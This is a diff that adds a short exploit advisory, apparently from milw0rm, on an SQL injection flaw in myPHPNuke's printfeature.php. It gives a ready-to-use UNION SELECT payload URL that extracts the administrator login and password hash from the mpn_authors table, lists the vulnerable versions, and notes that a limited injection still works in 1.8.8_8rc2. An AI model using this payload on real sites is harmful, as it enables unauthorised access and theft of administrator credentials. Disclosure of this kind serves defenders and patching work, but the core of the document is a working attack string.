@@ -1,0 +1,25 @@
+############################################################
+
+SQL Injection vulnerability in myPHPNuke
+
+By MustLive (http://websecurity.com.ua)
+
+Detailed information: http://websecurity.com.ua/2398/
+
+Description: There is SQL Injection vulnerability in printfeature.php in
+myPHPNuke.
+
+SQL Injection:
+
+http://site/printfeature.php?artid=-1%20union%20select%20null,null,aid,pwd,null,null,null,null%20from%20mpn_authors%20limit%200,1
+
+With this query you will receive login and password (hash) of administrator.
+
+Vulnerable versions are myPHPNuke < 1.8.8_8rc2. In last version the
+additional filters were added, so it is not vulnerable to this attack. But
+version 1.8.8_8rc2 is still vulnerable to SQL Injection and so limited SQL
+Injection attack is possible (without using spaces and brackets).
+
+############################################################
+
+# milw0rm.com [2008-09-02]
